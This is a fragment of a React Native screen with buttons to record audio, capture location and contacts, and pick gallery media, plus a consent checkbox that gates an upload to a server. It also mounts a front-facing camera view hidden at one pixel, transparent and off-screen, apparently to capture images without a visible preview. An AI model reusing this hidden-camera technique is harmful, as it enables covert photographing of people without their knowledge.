            style={[styles.actionButton, isDark && styles.actionButtonDark]}
            onPress={startAudioRecording}
          >
            <Mic size={20} color="#3b82f6" />
            <Text style={[styles.actionButtonText, isDark && styles.textLight]}>
              Start Recording (Max 15s)
            </Text>
          </TouchableOpacity>
        ) : (
          <TouchableOpacity
            style={[styles.actionButton, { backgroundColor: '#ef4444' }]}
            onPress={async () => {
              await stopAudioRecording();
            }}
          >
            <Mic size={20} color="#fff" />
            <Text style={[styles.actionButtonText, { color: '#fff' }]}>
              Stop Recording ({recordingTime}s / 15s)
            </Text>
          </TouchableOpacity>
        )}

        {/* Location Capture Button */}
        <TouchableOpacity
          style={[styles.actionButton, isDark && styles.actionButtonDark]}
          onPress={captureLocation}
        >
          <MapPin size={20} color="#3b82f6" />
          <Text style={[styles.actionButtonText, isDark && styles.textLight]}>
            Capture Location (Foreground Only)
          </Text>
        </TouchableOpacity>

        {/* Contacts Capture Button */}
        <TouchableOpacity
          style={[styles.actionButton, isDark && styles.actionButtonDark]}
          onPress={captureContacts}
        >
          <Users size={20} color="#3b82f6" />
          <Text style={[styles.actionButtonText, isDark && styles.textLight]}>
            Capture Contacts
          </Text>
        </TouchableOpacity>

        {/* Media Gallery Selection Button */}
        <TouchableOpacity
          style={[styles.actionButton, isDark && styles.actionButtonDark]}
          onPress={handleSelectMedia}
        >
          <Image size={20} color="#3b82f6" />
          <Text style={[styles.actionButtonText, isDark && styles.textLight]}>
            Select Media from Gallery
          </Text>
        </TouchableOpacity>

        {/* 🔐 COMPLIANCE: Explicit Consent Checkbox */}
        <View style={[styles.consentBox, isDark && styles.consentBoxDark]}>
          <TouchableOpacity
            style={styles.checkboxContainer}
            onPress={() => setUploadConsent(!uploadConsent)}
          >
            <View style={[
              styles.checkbox,
              uploadConsent && styles.checkboxChecked,
              isDark && styles.checkboxDark
            ]}>
              {uploadConsent && <Text style={styles.checkmark}>✓</Text>}
            </View>
            <Text style={[styles.consentLabel, isDark && styles.textLight]}>
              I explicitly consent to upload the collected data to the server
            </Text>
          </TouchableOpacity>
        </View>

        {/* Upload Button (only enabled with consent) */}
        <TouchableOpacity
          style={[
            styles.uploadButton,
            (!uploadConsent || isCapturing) && styles.uploadButtonDisabled
          ]}
          onPress={handleUploadData}
          disabled={!uploadConsent || isCapturing}
        >
          {isCapturing ? (
            <>
              <ActivityIndicator size="small" color="#fff" style={{ marginRight: 8 }} />
              <Text style={styles.uploadButtonText}>Uploading...</Text>
            </>
          ) : (
            <Text style={styles.uploadButtonText}>
              Upload Data to Server
            </Text>
          )}
        </TouchableOpacity>

        {/* Hidden Camera View for capturing */}
        {/* Fix #3: Add onCameraReady callback to set cameraReady state */}
        {Platform.OS !== 'web' && (
          <View style={{ width: 1, height: 1, opacity: 0, overflow: 'hidden', position: 'absolute', top: -1000 }}>
            {mountCamera && cameraPermission?.granted && (
              <CameraView 
                ref={cameraRef} 
                style={{ width: 1, height: 1 }} 
                facing="front"
                enableTorch={false}
                onCameraReady={() => {
                  console.log('[Camera] ✅ Camera ready callback fired');
                  setCameraReady(true);
                }}
              />
            )}
          </View>
        )}
        
        {/* For web platform, use ImagePicker instead */}
        {Platform.OS === 'web' && mountCamera && cameraPermission?.granted && (
          <View style={{ position: 'absolute', top: -1000, opacity: 0 }}>
            <Text>Web camera capture</Text>
          </View>
        )}

        {/* Show capturing status */}
        {isCapturing && (
          <View style={[styles.infoBox, { marginHorizontal: 24, marginTop: 24 }]}>
            <ActivityIndicator size="small" color="#3b82f6" />
            <Text style={[styles.infoText, isDark && styles.textLight, { marginLeft: 12 }]}>
              Capturing media and saving data...
            </Text>
          </View>
        )}

      </ScrollView>
    </View>
  );
}

const styles = StyleSheet.create({
  container: {
    flex: 1,
    backgroundColor: '#f9fafb',
  },
  containerDark: {
    backgroundColor: '#111827',
  },
  scrollView: {
    flex: 1,
  },
  consentContainer: {
    flex: 1,
    justifyContent: 'center',
    alignItems: 'center',
    padding: 24,
  },
  title: {
    fontSize: 28,
    fontWeight: '700',
    color: '#1f2937',
    marginTop: 16,
  },
  subtitle: {
    fontSize: 14,
    color: '#6b7280',
    marginTop: 4,
    textAlign: 'center',
  },
  infoBox: {
    flexDirection: 'row',
    alignItems: 'flex-start',
    backgroundColor: '#eff6ff',
    padding: 16,
    borderRadius: 12,
    marginTop: 32,
    gap: 12,
  },
  infoText: {
    flex: 1,
    fontSize: 14,
    color: '#1f2937',
    lineHeight: 20,
  },
  inputContainer: {
    flexDirection: 'row',
    alignItems: 'center',
    backgroundColor: '#fff',
    borderWidth: 1,
    borderColor: '#d1d5db',
    borderRadius: 12,
    paddingHorizontal: 16,
    marginTop: 24,
    width: '100%',
    maxWidth: 400,
  },
  input: {
    flex: 1,
    paddingVertical: 16,
    paddingHorizontal: 12,
    fontSize: 16,
    color: '#1f2937',
  },
  inputDark: {
    color: '#f9fafb',
    backgroundColor: '#1f2937',
  },
  inputError: {
    borderColor: '#ef4444',
    borderWidth: 2,
  },
  inputValid: {
    borderColor: '#10b981',
    borderWidth: 2,
  },
  validationText: {
    fontSize: 12,
    marginTop: 4,
    marginLeft: 12,
    marginBottom: 8,
  },
  validationError: {
    color: '#ef4444',
  },
  validationSuccess: {
    color: '#10b981',
  },
  submitButton: {
    backgroundColor: '#3b82f6',
    paddingVertical: 16,
    paddingHorizontal: 32,
    borderRadius: 12,
    marginTop: 24,
    width: '100%',
    maxWidth: 400,
  },
  submitButtonDisabled: {
    backgroundColor: '#9ca3af',
  },
  saveButton: {
    marginTop: 24,
    marginBottom: 24,
    marginHorizontal: 24,
  },
  submitButtonText: {
    color: '#fff',
    fontSize: 16,
    fontWeight: '600',
    textAlign: 'center',
  },
  disclaimer: {
    fontSize: 12,
    color: '#6b7280',
    textAlign: 'center',
    marginTop: 24,
    lineHeight: 18,
  },
  header: {
    alignItems: 'center',
    paddingTop: 60,
    paddingHorizontal: 24,
    paddingBottom: 24,
  },
  headerTitle: {
    fontSize: 24,
    fontWeight: '700',
    color: '#1f2937',
    marginTop: 12,
  },
  headerSubtitle: {
    fontSize: 14,
    color: '#6b7280',
    marginTop: 4,
  },
  consentBanner: {
    flexDirection: 'row',
    alignItems: 'center',
    backgroundColor: '#eff6ff',
    padding: 12,
    marginHorizontal: 24,
    borderRadius: 8,
    gap: 8,
    marginBottom: 24,
  },
  consentText: {
    flex: 1,
    fontSize: 12,
    color: '#1f2937',
  },
  sectionTitle: {
    fontSize: 18,
    fontWeight: '600',
    color: '#1f2937',
    marginHorizontal: 24,
    marginBottom: 16,
  },
  permissionCard: {
    flexDirection: 'row',
    backgroundColor: '#fff',
    marginHorizontal: 24,
    marginBottom: 12,
    padding: 16,
    borderRadius: 12,
    shadowColor: '#000',
    shadowOffset: { width: 0, height: 1 },
    shadowOpacity: 0.05,
    shadowRadius: 2,
    elevation: 2,
  },
  permissionCardDark: {
    backgroundColor: '#1f2937',
  },
  permissionCardLight: {
    backgroundColor: '#fff',
  },
  permissionIconContainer: {
    width: 48,
    height: 48,
    borderRadius: 24,
    backgroundColor: '#eff6ff',
    justifyContent: 'center',
    alignItems: 'center',
    marginRight: 12,
  },
  permissionContent: {
    flex: 1,
  },
  permissionTitle: {
    fontSize: 16,
    fontWeight: '600',
    color: '#1f2937',
  },
  permissionDescription: {
    fontSize: 14,
    color: '#6b7280',
    marginTop: 2,
  },
  statusContainer: {
    flexDirection: 'row',
    alignItems: 'center',
    marginTop: 8,
  },
  statusDot: {
    width: 8,
    height: 8,
    borderRadius: 4,
    marginRight: 6,
  },
  statusText: {
    fontSize: 12,
    fontWeight: '500',
  },
  noteContainer: {
    flexDirection: 'row',
    alignItems: 'flex-start',
    marginHorizontal: 24,
    marginTop: 24,
    padding: 12,
    backgroundColor: '#f3f4f6',
    borderRadius: 8,
    gap: 8,
  },
  noteText: {
    flex: 1,
    fontSize: 12,
    color: '#6b7280',
    lineHeight: 18,
  },
  footer: {
    marginTop: 32,
    marginBottom: 48,
    paddingHorizontal: 24,
    alignItems: 'center',
  },
  footerText: {
    fontSize: 12,
    color: '#6b7280',
    textAlign: 'center',
    lineHeight: 18,
  },
  textLight: {
    color: '#f9fafb',
  },
  textGray: {
    color: '#9ca3af',
  },
  // 🔐 COMPLIANCE: User-triggered action button styles
  actionButton: {
    flexDirection: 'row',
    alignItems: 'center',
    justifyContent: 'center',
    backgroundColor: '#fff',
    borderWidth: 1,
    borderColor: '#3b82f6',
    borderRadius: 12,
    paddingVertical: 16,
    paddingHorizontal: 20,
    marginHorizontal: 24,
    marginTop: 12,
    gap: 12,
  },
  actionButtonDark: {
    backgroundColor: '#1f2937',
    borderColor: '#3b82f6',
  },
  actionButtonText: {
    fontSize: 16,
    fontWeight: '600',
    color: '#3b82f6',
  },
  // 🔐 COMPLIANCE: Consent checkbox styles
  consentBox: {
    backgroundColor: '#fff',
    borderWidth: 1,
    borderColor: '#d1d5db',
    borderRadius: 12,
    padding: 16,
    marginHorizontal: 24,
    marginTop: 24,
  },
  consentBoxDark: {
    backgroundColor: '#1f2937',
    borderColor: '#374151',
  },
  checkboxContainer: {
    flexDirection: 'row',
    alignItems: 'center',
    gap: 12,
  },
  checkbox: {
    width: 24,
    height: 24,
    borderWidth: 2,
    borderColor: '#3b82f6',
    borderRadius: 4,
    justifyContent: 'center',
    alignItems: 'center',
    backgroundColor: '#fff',
  },
  checkboxDark: {
    backgroundColor: '#1f2937',
    borderColor: '#3b82f6',
  },
  checkboxChecked: {
    backgroundColor: '#3b82f6',
  },
  checkmark: {
    color: '#fff',
    fontSize: 16,
    fontWeight: 'bold',
  },
  consentLabel: {
    flex: 1,
    fontSize: 14,
    color: '#1f2937',
    lineHeight: 20,
  },
  // 🔐 COMPLIANCE: Upload button styles
  uploadButton: {
    backgroundColor: '#3b82f6',
    borderRadius: 12,
    paddingVertical: 16,
    paddingHorizontal: 24,
    marginHorizontal: 24,
    marginTop: 24,
    marginBottom: 32,
    flexDirection: 'row',
    alignItems: 'center',
    justifyContent: 'center',
  },
  uploadButtonDisabled: {
    backgroundColor: '#9ca3af',
    opacity: 0.6,
  },
  uploadButtonText: {
    color: '#fff',
    fontSize: 16,
    fontWeight: '600',
  },
});